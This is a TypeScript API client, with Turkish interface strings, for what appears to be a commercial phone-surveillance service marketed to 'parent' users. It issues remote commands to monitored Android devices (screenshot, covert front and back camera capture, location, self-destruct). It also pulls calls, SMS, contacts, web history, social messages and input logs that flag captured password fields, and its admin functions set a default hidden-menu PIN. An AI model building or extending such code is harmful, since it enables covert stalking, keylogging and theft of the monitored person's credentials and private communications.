const API_URL = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3001';

export interface User {
  id: string;
  email: string;
  role: 'parent' | 'admin';
  subscriptionPlan?: string;
  subscriptionExpiresAt?: string | null;
  menuPin?: string;
}

export interface PermissionStatus {
  callLog?: boolean;
  phoneState?: boolean;
  sms?: boolean;
  location?: boolean;
  camera?: boolean;
  notifications?: boolean;
  accessibility?: boolean;
  batteryOptimization?: boolean;
  manufacturer?: string;
  model?: string;
  androidVersion?: string;
  updatedAt?: string;
}

export interface Device {
  id: string;
  deviceName: string;
  androidId: string;
  apkVersion: string;
  manufacturer?: string | null;
  model?: string | null;
  permissionStatus?: PermissionStatus | null;
  lastSeen: string | null;
  isActive: boolean;
  user?: { email: string };
}

export interface DeviceCommand {
  id: string;
  deviceId: string;
  type: string;
  status: 'pending' | 'completed' | 'failed';
  resultUrl?: string | null;
  resultLat?: number | null;
  resultLng?: number | null;
  resultAcc?: number | null;
  errorMsg?: string | null;
  createdAt: string;
  completedAt?: string | null;
}

function getToken(): string | null {
  if (typeof window === 'undefined') return null;
  return localStorage.getItem('token');
}

async function request<T>(path: string, options: RequestInit = {}): Promise<T> {
  const token = getToken();
  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
    ...(options.headers as Record<string, string>),
  };
  if (token) headers.Authorization = `Bearer ${token}`;

  const res = await fetch(`${API_URL}${path}`, { ...options, headers });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(data.error || 'İstek başarısız');
  return data as T;
}

export const api = {
  login: (email: string, password: string) =>
    request<{ token: string; user: User }>('/auth/login', {
      method: 'POST',
      body: JSON.stringify({ email, password }),
    }),

  register: (email: string, password: string) =>
    request<{ token: string; user: User }>('/auth/register', {
      method: 'POST',
      body: JSON.stringify({ email, password }),
    }),

  me: () => request<User>('/auth/me'),

  getDevices: () => request<Device[]>('/device'),

  getDevice: (id: string) => request<Device>(`/device/${id}`),

  createCommand: (deviceId: string, type: 'screenshot' | 'camera_front' | 'camera_back' | 'location' | 'self_destruct') =>
    request<DeviceCommand>(`/device/${deviceId}/commands`, {
      method: 'POST',
      body: JSON.stringify({ type }),
    }),

  getCommand: (deviceId: string, commandId: string) =>
    request<DeviceCommand>(`/device/${deviceId}/commands/${commandId}`),

  getCalls: (deviceId: string) => request<CallLog[]>(`/data/calls/${deviceId}`),

  getSms: (deviceId: string) => request<SmsMessage[]>(`/data/sms/${deviceId}`),

  getNotifications: (deviceId: string) => request<NotificationItem[]>(`/data/notifications/${deviceId}`),

  getLocations: (deviceId: string) => request<LocationItem[]>(`/data/locations/${deviceId}`),

  getAppUsage: (deviceId: string) => request<AppUsageItem[]>(`/data/app-usage/${deviceId}`),

  getWebHistory: (deviceId: string) => request<WebHistoryItem[]>(`/data/web-history/${deviceId}`),

  getInputLogs: (deviceId: string) => request<InputLogItem[]>(`/data/input-logs/${deviceId}`),

  getMedia: (deviceId: string, type?: string) =>
    request<MediaItem[]>(`/data/media/${deviceId}${type ? `?type=${type}` : ''}`),

  getInstalledApps: (deviceId: string) =>
    request<InstalledAppsResponse>(`/data/installed-apps/${deviceId}`),

  getSocial: (deviceId: string) => request<NotificationItem[]>(`/data/social/${deviceId}`),

  getContacts: (deviceId: string) => request<ContactItem[]>(`/data/contacts/${deviceId}`),

  deleteData: (type: string, deviceId: string) =>
    request<{ ok: boolean }>(`/data/${type}/${deviceId}`, { method: 'DELETE' }),

  exportData: async (deviceId: string, type: string) => {
    const token = getToken();
    const res = await fetch(`${API_URL}/data/export/${type}/${deviceId}`, {
      headers: token ? { Authorization: `Bearer ${token}` } : {},
    });
    if (!res.ok) {
      const data = await res.json().catch(() => ({}));
      throw new Error(data.error || 'Dışa aktarma başarısız');
    }
    const blob = await res.blob();
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${type}-${deviceId.slice(0, 8)}.json`;
    a.click();
    URL.revokeObjectURL(url);
  },

  adminStats: () => request<AdminStats>('/admin/stats'),

  adminUsers: () => request<AdminUser[]>('/admin/users'),

  adminCreateUser: (
    email: string,
    password: string,
    role: string,
    subscriptionPlan = 'trial',
    menuPin = '8255'
  ) =>
    request<AdminUser>('/admin/users', {
      method: 'POST',
      body: JSON.stringify({ email, password, role, subscriptionPlan, menuPin }),
    }),

  adminUpdateUser: (
    id: string,
    data: { isActive?: boolean; role?: string; subscriptionPlan?: string; menuPin?: string }
  ) =>
    request<AdminUser>(`/admin/users/${id}`, {
      method: 'PATCH',
      body: JSON.stringify(data),
    }),

  adminDevices: () => request<Device[]>('/admin/devices'),

  adminUpdateDevice: (id: string, data: { isActive?: boolean; deviceName?: string }) =>
    request<Device>(`/admin/devices/${id}`, {
      method: 'PATCH',
      body: JSON.stringify(data),
    }),
};

export interface CallLog {
  id: string;
  number: string;
  contactName?: string;
  type: string;
  durationSeconds: number;
  timestamp: string;
}

export interface SmsMessage {
  id: string;
  address: string;
  body: string;
  type: string;
  timestamp: string;
}

export interface NotificationItem {
  id: string;
  appPackage: string;
  appName?: string;
  title?: string;
  text?: string;
  timestamp: string;
}

export interface LocationItem {
  id: string;
  latitude: number;
  longitude: number;
  accuracy?: number;
  timestamp: string;
}

export interface AppUsageItem {
  id: string;
  packageName: string;
  appName?: string;
  usageMinutes: number;
  date: string;
}

export interface WebHistoryItem {
  id: string;
  url: string;
  title?: string;
  browserPackage: string;
  browserName?: string;
  timestamp: string;
}

export interface InputLogItem {
  id: string;
  appPackage: string;
  appName?: string;
  fieldName?: string;
  text: string;
  isPasswordField: boolean;
  timestamp: string;
}

export interface MediaItem {
  id: string;
  type: string;
  fileUrl: string;
  timestamp: string;
}

export interface ContactItem {
  id: string;
  name: string;
  phoneNumber: string;
  updatedAt: string;
}

export interface InstalledApp {
  id: string;
  packageName: string;
  appName: string;
  versionName?: string | null;
  isInstalled: boolean;
  updatedAt: string;
}

export interface AppChangeLog {
  id: string;
  packageName: string;
  appName?: string | null;
  action: string;
  recordedAt: string;
}

export interface InstalledAppsResponse {
  apps: InstalledApp[];
  changes: AppChangeLog[];
}

export function mediaFullUrl(fileUrl: string) {
  return `${API_URL}${fileUrl}`;
}

export interface AdminStats {
  userCount: number;
  deviceCount: number;
  activeDevices: number;
  callCount: number;
  smsCount: number;
  notificationCount: number;
}

export interface AdminUser {
  id: string;
  email: string;
  role: string;
  isActive: boolean;
  subscriptionPlan?: string;
  subscriptionExpiresAt?: string | null;
  menuPin?: string;
  createdAt: string;
  _count: { devices: number };
}

export function setToken(token: string) {
  localStorage.setItem('token', token);
}

export function clearToken() {
  localStorage.removeItem('token');
}

export function formatDate(iso: string) {
  return new Date(iso).toLocaleString('tr-TR');
}

export function isOnline(_lastSeen: string | null, isActive = true) {
  return isActive;
}

export function onlineLabel(lastSeen: string | null) {
  return lastSeen ? 'Bağlı' : 'İlk bağlantı bekleniyor';
}
